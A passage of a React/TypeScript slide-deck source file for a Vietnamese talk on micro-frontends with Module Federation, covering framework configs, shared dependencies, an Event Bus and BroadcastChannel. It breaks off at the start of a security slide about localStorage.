import { type ReactNode } from 'react';
import { motion } from 'framer-motion';
import { CodeBlock } from '../components';
import {
    MonolithVsMfeDiagram,
    ModuleFederationArchDiagram,
    TokenSyncFlowDiagram,
    ModuleLoadingFlowDiagram,
    CSSIsolationDiagram,
    RoutingFlowDiagram,
    CICDPipelineDiagram,
    EventBusDiagram
} from '../diagrams';

export interface SlideData {
    id: number;
    title: string;
    section: string;
    content: ReactNode;
    variant?: 'default' | 'title' | 'section' | 'code' | 'diagram';
}

const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
    <motion.table
        className="w-full text-left border-collapse"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
    >
        <thead>
            <tr className="border-b-2 border-white/20">
                {headers.map((h, i) => (
                    <th key={i} className="py-3 px-4 text-[var(--accent-cyan)] font-semibold text-base">
                        {h}
                    </th>
                ))}
            </tr>
        </thead>
        <tbody>
            {rows.map((row, i) => (
                <motion.tr
                    key={i}
                    className="border-b border-white/10 hover:bg-white/5"
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ delay: 0.1 + i * 0.05 }}
                >
                    {row.map((cell, j) => (
                        <td
                            key={j}
                            className="py-3 px-4 text-sm"
                            dangerouslySetInnerHTML={{ __html: cell }}
                        />
                    ))}
                </motion.tr>
            ))}
        </tbody>
    </motion.table>
);

export const slides: SlideData[] = [
    // ==========================================
    // PHẦN 1: GIỚI THIỆU (Slides 1-5)
    // ==========================================

    // Slide 1: Title
    {
        id: 1,
        title: 'Micro-Frontend với Module Federation',
        section: 'Giới thiệu',
        variant: 'title',
        content: (
            <div className="text-center">
                <motion.div
                    className="text-6xl mb-6"
                    animate={{ scale: [1, 1.05, 1] }}
                    transition={{ repeat: Infinity, duration: 3 }}
                >
                    🧩
                </motion.div>
                <motion.h1
                    className="text-slide-title mb-4"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                >
                    <span className="text-[var(--accent-blue)]">Micro-Frontend</span>
                    <br />với <span className="text-[var(--accent-purple)]">Module Federation</span>
                </motion.h1>
                <motion.p
                    className="text-slide-body text-[var(--text-secondary)]"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.3 }}
                >
                    Từ cơ bản đến nâng cao
                </motion.p>
            </div>
        ),
    },

    // Slide 2: Agenda
    {
        id: 2,
        title: 'Nội dung trình bày',
        section: 'Giới thiệu',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Nội dung trình bày</h2>
                <div className="grid grid-cols-2 gap-4">
                    {[
                        { num: '01', title: 'Micro-Frontend Cơ bản', desc: 'Định nghĩa, vấn đề Monolith, lợi ích' },
                        { num: '02', title: 'Module Federation', desc: 'Thuật ngữ, remoteEntry.js, Shared Dependencies' },
                        { num: '03', title: 'Cấu hình Framework', desc: 'UmiJS, Vite, Webpack config' },
                        { num: '04', title: 'Communication', desc: 'Event Bus, BroadcastChannel, Token Sync' },
                        { num: '05', title: 'CSS Isolation', desc: 'CSS Modules, CSS-in-JS, BEM, Shadow DOM' },
                        { num: '06', title: 'Routing & Security', desc: 'History Sync, XSS Prevention, Defense in Depth' },
                        { num: '07', title: 'DevOps & Testing', desc: 'CI/CD, Versioning, Testing Strategy' },
                        { num: '08', title: 'Best Practices', desc: 'Troubleshooting, Performance, Checklist' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.num}
                            className="glass p-4 rounded-lg flex gap-4"
                            initial={{ opacity: 0, x: -20 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: i * 0.08 }}
                        >
                            <span className="text-2xl font-bold text-[var(--accent-purple)]">{item.num}</span>
                            <div>
                                <h3 className="font-bold text-white">{item.title}</h3>
                                <p className="text-xs text-[var(--text-muted)]">{item.desc}</p>
                            </div>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // Slide 3: MFE là gì?
    {
        id: 3,
        title: 'Micro-Frontend là gì?',
        section: 'Phần 1: MFE Cơ bản',
        variant: 'section',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Micro-Frontend là gì?</h2>
                <motion.div
                    className="glass p-6 rounded-xl mb-6"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                >
                    <p className="text-slide-body leading-relaxed">
                        Micro-Frontend là kiến trúc chia một ứng dụng frontend <span className="text-[var(--accent-red)]">monolithic (đơn khối)</span>
                        thành các ứng dụng <span className="text-[var(--accent-green)]">nhỏ hơn, độc lập</span>.
                    </p>
                </motion.div>
                <div className="grid grid-cols-3 gap-4">
                    {[
                        { icon: '👥', title: 'Phát triển độc lập', desc: 'Mỗi team sở hữu một phần của UI' },
                        { icon: '🚀', title: 'Deploy độc lập', desc: 'Update một phần không ảnh hưởng phần khác' },
                        { icon: '🔧', title: 'Công nghệ linh hoạt', desc: 'Team A dùng React, Team B dùng Vue' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.title}
                            className="glass p-5 rounded-lg text-center"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: 0.2 + i * 0.1 }}
                        >
                            <div className="text-3xl mb-2">{item.icon}</div>
                            <h4 className="text-[var(--accent-cyan)] font-bold text-sm">{item.title}</h4>
                            <p className="text-xs text-[var(--text-secondary)] mt-1">{item.desc}</p>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // Slide 4: Monolith vs MFE Diagram
    {
        id: 4,
        title: 'Monolith vs Micro-Frontend',
        section: 'Phần 1: MFE Cơ bản',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Monolith vs Micro-Frontend</h2>
                <MonolithVsMfeDiagram />
            </div>
        ),
    },

    // Slide 5: Vấn đề với Monolith
    {
        id: 5,
        title: 'Vấn đề với Monolith',
        section: 'Phần 1: MFE Cơ bản',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">
                    <span className="text-[var(--accent-red)]">⚠️</span> Vấn đề với Monolith
                </h2>
                <Table
                    headers={['Vấn đề', 'Mô tả chi tiết']}
                    rows={[
                        ['<span class="text-[var(--accent-red)] font-bold">Build chậm</span>', 'App lớn (&gt;100K LOC) → build mất 10-30 phút'],
                        ['<span class="text-[var(--accent-red)] font-bold">Conflict nhiều</span>', '10 developers cùng merge → Git conflicts thường xuyên'],
                        ['<span class="text-[var(--accent-red)] font-bold">Coupling cao</span>', 'Thay đổi 1 module → phải test toàn bộ'],
                        ['<span class="text-[var(--accent-red)] font-bold">Deploy rủi ro</span>', 'Bug 1 feature → rollback toàn bộ app'],
                        ['<span class="text-[var(--accent-red)] font-bold">Khó scale team</span>', 'Thêm người → overhead tăng (meetings, conflicts)'],
                    ]}
                />
            </div>
        ),
    },

    // Slide 6: Lợi ích MFE
    {
        id: 6,
        title: 'Lợi ích của Micro-Frontend',
        section: 'Phần 1: MFE Cơ bản',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">
                    <span className="text-[var(--accent-green)]">✅</span> Lợi ích của Micro-Frontend
                </h2>
                <Table
                    headers={['Lợi ích', 'Mô tả chi tiết']}
                    rows={[
                        ['<span class="text-[var(--accent-green)] font-bold">Build nhanh</span>', 'Mỗi app nhỏ (~10K LOC) → build 1-2 phút'],
                        ['<span class="text-[var(--accent-green)] font-bold">Team độc lập</span>', 'Team A deploy không cần đợi Team B review/merge'],
                        ['<span class="text-[var(--accent-green)] font-bold">Fault isolation</span>', 'Bug ở Products → Users vẫn hoạt động bình thường'],
                        ['<span class="text-[var(--accent-green)] font-bold">Tech flexibility</span>', 'Team mới có thể dùng framework mới (Vue 3, Solid.js)'],
                        ['<span class="text-[var(--accent-green)] font-bold">Scale dễ dàng</span>', 'Thêm team = tạo remote app mới, plug vào host'],
                    ]}
                />
            </div>
        ),
    },

    // Slide 7: Khi nào KHÔNG nên dùng
    {
        id: 7,
        title: 'Khi nào KHÔNG nên dùng MFE?',
        section: 'Phần 1: MFE Cơ bản',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Khi nào nên / không nên dùng MFE?</h2>
                <div className="grid grid-cols-2 gap-6">
                    <motion.div className="glass p-6 rounded-lg border-2 border-[var(--accent-red)]/50" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-red)] font-bold mb-4 text-lg">❌ KHÔNG dùng khi</h4>
                        <ul className="text-sm text-[var(--text-secondary)] space-y-2">
                            <li>• App nhỏ, 1-3 developers</li>
                            <li>• Không cần deploy độc lập</li>
                            <li>• Team nhỏ, không có vấn đề coordination</li>
                            <li>• Startup MVP cần ship nhanh</li>
                            <li>• Chưa có DevOps maturity</li>
                        </ul>
                    </motion.div>
                    <motion.div className="glass p-6 rounded-lg border-2 border-[var(--accent-green)]/50" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-green)] font-bold mb-4 text-lg">✅ NÊN dùng khi</h4>
                        <ul className="text-sm text-[var(--text-secondary)] space-y-2">
                            <li>• Team lớn (&gt;5 devs) hoặc nhiều team</li>
                            <li>• Cần deploy độc lập các feature</li>
                            <li>• Legacy migration dần dần</li>
                            <li>• Nhiều product lines cùng platform</li>
                            <li>• Scale organization, không chỉ code</li>
                        </ul>
                    </motion.div>
                </div>
                <motion.div className="mt-6 glass p-4 rounded-lg border border-[var(--accent-orange)]/50 text-sm text-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-orange)]">⚠️ Lưu ý:</strong> MFE thêm complexity đáng kể. Giải quyết vấn đề <strong>organization</strong>, không phải technical!
                </motion.div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 2: MODULE FEDERATION (Slides 8-15)
    // ==========================================

    // Slide 8: Module Federation là gì
    {
        id: 8,
        title: 'Module Federation là gì?',
        section: 'Phần 2: Module Federation',
        variant: 'section',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Module Federation là gì?</h2>
                <motion.div className="glass p-6 rounded-xl mb-6" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
                    <p className="text-slide-body leading-relaxed">
                        Module Federation là plugin của <span className="text-[var(--accent-blue)] font-bold">Webpack 5</span> cho phép:
                    </p>
                </motion.div>
                <div className="grid grid-cols-3 gap-4">
                    {[
                        { icon: '🌐', title: 'Load Runtime', desc: 'Load JS modules từ remote server tại runtime (không phải build time)' },
                        { icon: '📦', title: 'Không cần npm', desc: 'Không cần publish lên npm, import trực tiếp từ URL' },
                        { icon: '🔗', title: 'Share Dependencies', desc: 'Chia sẻ dependencies (React, antd) để tránh duplicate' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.title}
                            className="glass p-5 rounded-lg"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: 0.2 + i * 0.1 }}
                        >
                            <div className="text-3xl mb-3">{item.icon}</div>
                            <h4 className="text-[var(--accent-cyan)] font-bold text-sm mb-2">{item.title}</h4>
                            <p className="text-xs text-[var(--text-secondary)]">{item.desc}</p>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // Slide 9: Ví dụ đơn giản
    {
        id: 9,
        title: 'Module Federation - Ví dụ',
        section: 'Phần 2: Module Federation',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Ví dụ đơn giản</h2>
                <div className="grid grid-cols-2 gap-4">
                    <div>
                        <motion.div className="glass p-4 rounded-lg mb-4 border-2 border-[var(--accent-red)]/50" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                            <h4 className="text-[var(--accent-red)] font-bold mb-2">❌ Cách cũ: Publish npm</h4>
                            <code className="text-xs text-[var(--text-muted)]">npm install @company/product-grid</code>
                        </motion.div>
                        <motion.div className="glass p-4 rounded-lg border-2 border-[var(--accent-green)]/50" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }}>
                            <h4 className="text-[var(--accent-green)] font-bold mb-2">✅ Module Federation</h4>
                            <code className="text-xs text-[var(--text-muted)]">import('remote2/ProductGrid')</code>
                        </motion.div>
                    </div>
                    <CodeBlock
                        title="Host App"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Import trực tiếp từ remote
const ProductGrid = lazy(() => 
  import('remote2/ProductGrid')
);

// Webpack sẽ fetch từ:
// http://localhost:3002/remoteEntry.js`}
                    />
                </div>
            </div>
        ),
    },

    // Slide 10: Thuật ngữ quan trọng
    {
        id: 10,
        title: 'Thuật ngữ quan trọng',
        section: 'Phần 2: Module Federation',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Thuật ngữ quan trọng</h2>
                <Table
                    headers={['Thuật ngữ', 'Định nghĩa', 'Ví dụ']}
                    rows={[
                        ['<span class="text-[var(--accent-blue)] font-bold">Host</span> <span class="text-[var(--text-muted)]">(Ứng dụng Cha)</span>', 'App tiêu thụ (consume) modules từ remotes', 'host-umi4 - app chính'],
                        ['<span class="text-[var(--accent-green)] font-bold">Remote</span> <span class="text-[var(--text-muted)]">(Ứng dụng Con)</span>', 'App cung cấp (expose) modules cho hosts', 'remote-vite - ProductGrid'],
                        ['<span class="text-[var(--accent-orange)] font-bold">remoteEntry.js</span>', 'File manifest chứa metadata', 'http://...3002/remoteEntry.js'],
                        ['<span class="text-[var(--accent-purple)] font-bold">Shared</span>', 'Dependencies chia sẻ giữa apps', 'react, react-dom, antd'],
                        ['<span class="text-[var(--accent-cyan)] font-bold">Singleton</span>', 'Đảm bảo chỉ 1 instance', 'React phải singleton!'],
                    ]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-blue)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
                    <strong className="text-[var(--accent-blue)]">💡 Lưu ý:</strong> Trong code config vẫn sử dụng thuật ngữ tiếng Anh (<code>remotes</code>, <code>exposes</code>) để đồng bộ với thư viện.
                </motion.div>
            </div>
        ),
    },

    // Slide 11: remoteEntry.js
    {
        id: 11,
        title: 'remoteEntry.js là gì?',
        section: 'Phần 2: Module Federation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">remoteEntry.js - File Manifest</h2>
                <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-4">
                        <motion.div className="glass p-4 rounded-lg" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                            <h4 className="text-[var(--accent-cyan)] font-bold mb-2">📦 Nội dung chứa gì?</h4>
                            <ul className="text-sm space-y-1 text-[var(--text-secondary)]">
                                <li>• Tên của remote app</li>
                                <li>• Danh sách modules được expose</li>
                                <li>• Version của shared dependencies</li>
                                <li>• Paths đến actual chunk files</li>
                            </ul>
                        </motion.div>
                        <motion.div className="glass p-4 rounded-lg" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }}>
                            <h4 className="text-[var(--accent-orange)] font-bold mb-2">🔄 Tên file theo Framework</h4>
                            <Table
                                headers={['Framework', 'Default Name']}
                                rows={[
                                    ['Webpack', 'remoteEntry.js'],
                                    ['UmiJS v4', 'remote.js'],
                                    ['Vite', 'remoteEntry.js'],
                                ]}
                            />
                        </motion.div>
                    </div>
                    <CodeBlock
                        title="Có thể đổi tên"
                        language="typescript"
                        showLineNumbers={false}
                        code={`// Vite
federation({ 
  filename: 'customRemote.js' 
})

// Webpack
new ModuleFederationPlugin({ 
  filename: 'my-entry.js' 
})`}
                    />
                </div>
            </div>
        ),
    },

    // Slide 12: Module Loading Flow
    {
        id: 12,
        title: 'Luồng Load Module',
        section: 'Phần 2: Module Federation',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Module Loading Flow</h2>
                <ModuleLoadingFlowDiagram />
            </div>
        ),
    },

    // Slide 13: Shared Dependencies
    {
        id: 13,
        title: 'Shared Dependencies',
        section: 'Phần 2: Module Federation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">Cấu hình Shared Dependencies</h2>
                <div className="grid grid-cols-2 gap-4">
                    <div>
                        <Table
                            headers={['Option', 'Mô tả']}
                            rows={[
                                ['<code class="text-[var(--accent-blue)]">singleton</code>', 'Chỉ 1 instance (React BẮT BUỘC!)'],
                                ['<code class="text-[var(--accent-green)]">eager</code>', 'Load ngay, không lazy'],
                                ['<code class="text-[var(--accent-orange)]">requiredVersion</code>', 'Version tối thiểu'],
                                ['<code class="text-[var(--accent-purple)]">strictVersion</code>', 'Phải đúng version'],
                            ]}
                        />
                    </div>
                    <CodeBlock
                        title="Ví dụ đầy đủ"
                        language="typescript"
                        showLineNumbers={false}
                        code={`shared: {
  react: {
    singleton: true,  // BẮT BUỘC!
    eager: true,      // Tránh flash
    requiredVersion: '^18.0.0',
  },
  antd: { singleton: true },
  lodash: { /* Không singleton OK */ },
}`}
                    />
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-red)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-red)]">⚠️ Quan trọng:</strong> React PHẢI là singleton, nếu không hooks sẽ break! (Invalid hook call error)
                </motion.div>
            </div>
        ),
    },

    // Slide 14: Architecture Diagram
    {
        id: 14,
        title: 'Kiến trúc Module Federation',
        section: 'Phần 2: Module Federation',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Kiến trúc Module Federation</h2>
                <ModuleFederationArchDiagram />
            </div>
        ),
    },

    // Slide 15: Bidirectional Sharing
    {
        id: 15,
        title: 'Bidirectional Sharing',
        section: 'Phần 2: Module Federation',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">App vừa là Host vừa là Remote?</h2>
                <motion.div className="glass p-4 rounded-lg mb-4 border border-[var(--accent-green)]/30" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <p className="text-sm"><strong className="text-[var(--accent-green)]">✅ CÓ THỂ!</strong> Gọi là "Bidirectional Hosts"</p>
                </motion.div>
                <div className="grid grid-cols-2 gap-6">
                    <motion.div className="glass p-6 rounded-lg text-center" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-blue)] font-bold mb-2">App A</h4>
                        <p className="text-xs text-[var(--text-muted)] mb-2">(host + remote)</p>
                        <div className="text-sm space-y-1">
                            <div className="text-[var(--accent-green)]">exposes: ./CompA</div>
                            <div className="text-[var(--accent-orange)]">remotes: appB</div>
                        </div>
                    </motion.div>
                    <motion.div className="glass p-6 rounded-lg text-center" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-purple)] font-bold mb-2">App B</h4>
                        <p className="text-xs text-[var(--text-muted)] mb-2">(host + remote)</p>
                        <div className="text-sm space-y-1">
                            <div className="text-[var(--accent-green)]">exposes: ./CompB</div>
                            <div className="text-[var(--accent-orange)]">remotes: appA</div>
                        </div>
                    </motion.div>
                </div>
                <motion.div className="mt-4 text-center text-[var(--accent-cyan)] text-2xl" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    ◄───────────────►
                </motion.div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 3: CẤU HÌNH FRAMEWORK (Slides 16-19)
    // ==========================================

    // Slide 16: Library Recommendations
    {
        id: 16,
        title: 'Library Recommendations',
        section: 'Phần 3: Cấu hình Framework',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Library theo Platform</h2>
                <Table
                    headers={['Platform', 'Library', 'Lý do đề xuất']}
                    rows={[
                        ['<span class="text-[var(--accent-blue)] font-bold">Webpack</span>', 'ModuleFederationPlugin', 'Native, best documented'],
                        ['<span class="text-[var(--accent-green)] font-bold">UmiJS v3/v4</span>', '@umijs/plugin-mf', 'Zero config, tích hợp sẵn'],
                        ['<span class="text-[var(--accent-purple)] font-bold">Vite</span>', '@originjs/vite-plugin-federation', 'Stable, community-tested'],
                        ['<span class="text-[var(--accent-orange)] font-bold">Next.js</span>', '@module-federation/nextjs-mf', 'Official, SSR support'],
                    ]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-cyan)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-cyan)]">💡 Note:</strong> Theo dõi Module Federation 2.0 (Universe) của ByteDance cho hỗ trợ SSR và App Router tốt hơn.
                </motion.div>
            </div>
        ),
    },

    // Slide 17: UmiJS Host Config
    {
        id: 17,
        title: 'UmiJS - Host Config',
        section: 'Phần 3: Cấu hình Framework',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">UmiJS v4 - Host Configuration</h2>
                <CodeBlock
                    title="host-umi4/.umirc.ts"
                    language="typescript"
                    code={`import { defineConfig } from '@umijs/max';

export default defineConfig({
  mf: {
    name: 'hostUmi4',
    remotes: [
      { name: 'remote1', entry: 'http://localhost:3001/remote.js' },
      { name: 'remote2', entry: 'http://localhost:3002/assets/remoteEntry.js' },
    ],
    shared: {
      react: { singleton: true, eager: true },
      'react-dom': { singleton: true, eager: true },
      antd: { singleton: true },
    },
  },
});`}
                    highlightLines={[6, 7, 8, 11, 12]}
                />
            </div>
        ),
    },

    // Slide 18: UmiJS Remote Config
    {
        id: 18,
        title: 'UmiJS - Remote Config',
        section: 'Phần 3: Cấu hình Framework',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">UmiJS v4 - Remote Configuration</h2>
                <CodeBlock
                    title="remote-umi/.umirc.ts"
                    language="typescript"
                    code={`export default defineConfig({
  mfsu: false,  // ⚠️ QUAN TRỌNG: Tắt MFSU

  mf: {
    name: 'remote1',
    library: { type: 'var', name: 'remote1' },
    exposes: {
      './UserList': './src/components/UserList',
      './UserDetail': './src/components/UserDetail',
    },
    shared: {
      react: { singleton: true },
      'react-dom': { singleton: true },
    },
  },
});`}
                    highlightLines={[2, 7, 8, 9]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-orange)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <strong className="text-[var(--accent-orange)]">⚠️ Quan trọng:</strong> Phải tắt <code>mfsu: false</code> khi làm remote app!
                </motion.div>
            </div>
        ),
    },

    // Slide 19: Vite Remote Config
    {
        id: 19,
        title: 'Vite - Remote Config',
        section: 'Phần 3: Cấu hình Framework',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">React + Vite - Remote Configuration</h2>
                <CodeBlock
                    title="vite.config.ts"
                    language="typescript"
                    code={`import federation from '@originjs/vite-plugin-federation';

export default defineConfig({
  plugins: [
    react(),
    federation({
      name: 'remote2',
      filename: 'remoteEntry.js',
      exposes: {
        './ProductGrid': './src/components/ProductGrid',
      },
      shared: ['react', 'react-dom', 'antd'],
    }),
  ],
  build: { target: 'esnext' },
});`}
                    highlightLines={[6, 9, 10, 12]}
                />
            </div>
        ),
    },

    // ==========================================
    // PHẦN 4: COMMUNICATION (Slides 20-25)
    // ==========================================

    // Slide 20: Communication Overview
    {
        id: 20,
        title: 'Cross-App Communication',
        section: 'Phần 4: Communication',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Các phương thức giao tiếp</h2>
                <Table
                    headers={['Phương thức', 'Phạm vi', 'Ưu điểm', 'Nhược điểm']}
                    rows={[
                        ['<span class="text-[var(--accent-blue)] font-bold">BroadcastChannel</span>', 'Cùng domain, nhiều tab', 'Đơn giản, built-in', 'Chỉ cùng domain'],
                        ['<span class="text-[var(--accent-green)] font-bold">MessageChannel</span>', 'Cùng page, cross-origin', 'Nhanh, bidirectional', 'Setup phức tạp'],
                        ['<span class="text-[var(--accent-purple)] font-bold">CustomEvent</span>', 'Cùng page', 'Rất đơn giản', 'Chỉ cùng page'],
                        ['<span class="text-[var(--accent-orange)] font-bold">Event Bus</span>', 'Cùng page', 'Type-safe, flexible', 'Cần implement'],
                    ]}
                />
            </div>
        ),
    },

    // Slide 21: Event Bus Definition
    {
        id: 21,
        title: 'Event Bus là gì?',
        section: 'Phần 4: Communication',
        variant: 'section',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Event Bus là gì?</h2>
                <motion.div className="glass p-6 rounded-xl mb-6" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
                    <p className="text-slide-body leading-relaxed">
                        <span className="text-[var(--accent-cyan)] font-semibold">Event Bus</span> là pattern cho phép các component/micro-frontend
                        <span className="text-[var(--accent-green)]"> giao tiếp với nhau</span> mà không cần biết về sự tồn tại của nhau.
                    </p>
                </motion.div>
                <div className="grid grid-cols-3 gap-4">
                    {[
                        { icon: '📤', title: 'Publisher', desc: 'Gửi event + data', color: 'blue' },
                        { icon: '🚌', title: 'Event Bus', desc: 'Trung gian điều phối', color: 'purple' },
                        { icon: '📥', title: 'Subscriber', desc: 'Nhận và xử lý event', color: 'green' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.title}
                            className={`glass p-5 rounded-lg text-center border-2 border-[var(--accent-${item.color})]/30`}
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: 0.2 + i * 0.1 }}
                        >
                            <div className="text-3xl mb-2">{item.icon}</div>
                            <h4 className={`text-[var(--accent-${item.color})] font-bold`}>{item.title}</h4>
                            <p className="text-xs text-[var(--text-secondary)] mt-1">{item.desc}</p>
                        </motion.div>
                    ))}
                </div>
                <motion.div className="mt-6 glass p-4 rounded-lg text-sm text-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
                    <strong className="text-[var(--accent-cyan)]">💡 Lợi ích:</strong> Loose coupling - các MFE không phụ thuộc trực tiếp vào nhau!
                </motion.div>
            </div>
        ),
    },

    // Slide 22: Event Bus Diagram
    {
        id: 22,
        title: 'Event Bus Pattern',
        section: 'Phần 4: Communication',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Event Bus Pattern (Pub/Sub)</h2>
                <EventBusDiagram />
            </div>
        ),
    },

    // Slide 23: Event Bus Implementation
    {
        id: 23,
        title: 'Event Bus Implementation',
        section: 'Phần 4: Communication',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">Event Bus Implementation</h2>
                <CodeBlock
                    title="shared/utils/eventBus.ts"
                    language="typescript"
                    code={`type EventCallback = (data?: unknown) => void;

class EventBus {
  private events: Map<string, EventCallback[]> = new Map();

  on(event: string, callback: EventCallback): () => void {
    if (!this.events.has(event)) this.events.set(event, []);
    this.events.get(event)!.push(callback);
    // Return unsubscribe function
    return () => {
      const cbs = this.events.get(event);
      if (cbs) cbs.splice(cbs.indexOf(callback), 1);
    };
  }

  emit(event: string, data?: unknown): void {
    this.events.get(event)?.forEach(cb => cb(data));
  }
}

export const eventBus = new EventBus();`}
                    highlightLines={[6, 7, 8, 16, 17]}
                />
            </div>
        ),
    },

    // Slide 24: BroadcastChannel
    {
        id: 24,
        title: 'BroadcastChannel API',
        section: 'Phần 4: Communication',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">BroadcastChannel - Cross-Tab Communication</h2>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="Gửi message"
                        language="typescript"
                        showLineNumbers={false}
                        code={`// Tạo channel
const channel = new BroadcastChannel('mfe-events');

// Gửi message
channel.postMessage({ 
  type: 'user:selected', 
  userId: '123' 
});`}
                    />
                    <CodeBlock
                        title="Nhận message"
                        language="typescript"
                        showLineNumbers={false}
                        code={`// Lắng nghe
channel.onmessage = (event) => {
  const { type, userId } = event.data;
  
  if (type === 'user:selected') {
    console.log('User selected:', userId);
  }
};`}
                    />
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-green)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <strong className="text-[var(--accent-green)]">✅ Use case:</strong> Sync trạng thái giữa nhiều tab của cùng một domain (ví dụ: logout tất cả tab).
                </motion.div>
            </div>
        ),
    },

    // Slide 25: Token Sync Flow
    {
        id: 25,
        title: 'Token Sync Strategy',
        section: 'Phần 4: Communication',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Token Sync giữa các MFE</h2>
                <TokenSyncFlowDiagram />
            </div>
        ),
    },

    // ==========================================
    // PHẦN 5: SECURITY (Slides 26-28)
    // ==========================================

    // Slide 26: Token Storage Problem
    {
        id: 26,
        title: 'Vấn đề với localStorage',
        section: 'Phần 5: Security',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">
